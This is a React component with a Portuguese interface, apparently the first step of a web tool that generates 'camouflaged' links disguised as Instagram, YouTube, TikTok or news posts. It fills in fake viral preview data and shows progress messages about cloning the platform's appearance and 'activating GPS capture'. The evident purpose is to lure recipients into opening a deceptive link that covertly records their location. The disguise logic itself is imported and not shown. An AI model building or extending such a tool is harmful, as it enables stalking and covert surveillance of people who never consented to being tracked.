"use client"

import { useState, useRef } from "react"
import { Star, Zap } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Progress } from "@/components/ui/progress"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { getCamouflage } from "./constants"

interface Props {
  onDone: (data: {
    customMessage: string
    linkName: string
    redirectUrl: string
    camouflage: string
    previewData: {
      profileName: string
      contentTitle: string
      contentDescription: string
      hashtags: string
      contentType: "video" | "photo" | "story" | "news" | "music" | "post"
    }
  }) => void
}

export function Step1Config({ onDone }: Props) {
  const [selectedPlatform, setSelectedPlatform] = useState("")
  const [generating, setGenerating] = useState(false)
  const [progress, setProgress] = useState(0)

  const fired = useRef(false)

  const platforms = [
    {
      id: "instagram",
      name: "Instagram",
      icon: "📸",
      description: "Posts e Stories",
      color: "from-pink-500 to-purple-500",
      example: "Foto viral com 50k curtidas",
      redirectUrl: "instagram.com",
    },
    {
      id: "youtube",
      name: "YouTube",
      icon: "🎥",
      description: "Vídeos e Shorts",
      color: "from-red-500 to-red-600",
      example: "Vídeo chocante viral",
      redirectUrl: "youtube.com",
    },
    {
      id: "tiktok",
      name: "TikTok",
      icon: "🎵",
      description: "Vídeos curtos",
      color: "from-black to-gray-800",
      example: "Dance viral trending",
      redirectUrl: "tiktok.com",
    },
    {
      id: "news",
      name: "Notícias",
      icon: "📰",
      description: "G1, UOL, Folha",
      color: "from-blue-500 to-blue-600",
      example: "Notícia urgente Brasil",
      redirectUrl: "g1.globo.com",
    },
  ]

  const selectedPlatformData = platforms.find((p) => p.id === selectedPlatform)

  const scrollToTop = () => {
    window.scrollTo({ top: 0, behavior: "smooth" })
  }

  const generateLink = () => {
    if (!selectedPlatformData) return

    setGenerating(true)
    setProgress(0)

    const id = setInterval(() => {
      setProgress((p) => {
        if (p >= 100) {
          clearInterval(id)
          setTimeout(() => {
            setGenerating(false)
            setTimeout(() => {
              confirmGeneration()
            }, 1000)
          }, 500)
          return 100
        }
        return p + 12
      })
    }, 120)
  }

  const confirmGeneration = () => {
    if (!fired.current && selectedPlatformData) {
      fired.current = true
      scrollToTop()
      setTimeout(() => {
        onDone({
          customMessage: "Olha esse conteúdo incrível que encontrei!",
          linkName: selectedPlatformData.example,
          redirectUrl: selectedPlatformData.redirectUrl,
          camouflage: getCamouflage(selectedPlatformData.redirectUrl),
          previewData: {
            profileName:
              selectedPlatformData.id === "instagram"
                ? "@viral_content"
                : selectedPlatformData.id === "youtube"
                  ? "Canal Viral"
                  : selectedPlatformData.id === "tiktok"
                    ? "@trending_dance"
                    : "Portal Notícias",
            contentTitle: selectedPlatformData.example,
            contentDescription: `Conteúdo viral do ${selectedPlatformData.name}`,
            hashtags: "#viral #trending",
            contentType:
              selectedPlatformData.id === "news" ? "news" : selectedPlatformData.id === "tiktok" ? "video" : "photo",
          },
        })
      }, 300)
    }
  }

  return (
    <Card className="bg-gradient-to-br from-purple-900/50 to-purple-800/30 border-purple-500/30 backdrop-blur-lg">
      <CardHeader className="pb-4">
        <CardTitle className="flex items-center gap-3 text-lg sm:text-xl text-white">
          <div className="w-8 h-8 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center text-sm font-bold">
            1
          </div>
          Escolher Plataforma
          <Badge className="bg-purple-500/20 text-purple-300 border-purple-500/30 ml-auto text-xs">
            <Star className="h-3 w-3 mr-1" />
            Simples
          </Badge>
        </CardTitle>
        <p className="text-purple-200 text-sm mt-2">Qual plataforma você quer camuflar?</p>
      </CardHeader>

      <CardContent className="px-4 sm:px-6 space-y-6">
        <>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
            {platforms.map((platform) => (
              <button
                key={platform.id}
                onClick={() => setSelectedPlatform(platform.id)}
                className={`p-4 rounded-xl border-2 transition-all duration-300 text-left ${
                  selectedPlatform === platform.id
                    ? "border-white bg-white/10 scale-105"
                    : "border-white/20 bg-white/5 hover:bg-white/10 hover:border-white/40"
                }`}
              >
                <div className="flex items-center gap-3 mb-2">
                  <span className="text-2xl">{platform.icon}</span>
                  <div>
                    <div className="text-white font-bold text-sm sm:text-base">{platform.name}</div>
                    <div className="text-gray-300 text-xs">{platform.description}</div>
                  </div>
                </div>
                <div className="text-gray-400 text-xs mt-2">Ex: {platform.example}</div>
              </button>
            ))}
          </div>

          {selectedPlatform && !generating && (
            <div className="space-y-4">
              <div className="bg-gradient-to-r from-blue-900/40 to-indigo-900/40 border border-blue-400/30 rounded-xl p-4">
                <div className="text-center">
                  <div className="text-3xl mb-2">{selectedPlatformData?.icon}</div>
                  <h3 className="text-white font-bold text-lg mb-1">{selectedPlatformData?.name} Selecionado</h3>
                  <p className="text-blue-200 text-sm">Vamos criar um link idêntico ao {selectedPlatformData?.name}</p>
                </div>
              </div>

              <Button
                onClick={generateLink}
                className="w-full bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 h-12 sm:h-14 font-bold text-base sm:text-lg"
              >
                <Zap className="h-5 w-5 mr-2" />
                Criar Link Camuflado
              </Button>
            </div>
          )}

          {generating && (
            <div className="space-y-4">
              <div className="text-center">
                <div className="text-white font-bold text-base sm:text-lg mb-3">
                  Criando camuflagem do {selectedPlatformData?.name}...
                </div>
                <Progress value={progress} className="h-3" />
                <p className="text-gray-400 text-sm mt-2">
                  {progress < 50 ? "Clonando aparência..." : "Ativando captura GPS..."}
                </p>
              </div>
            </div>
          )}
        </>
      </CardContent>
    </Card>
  )
}
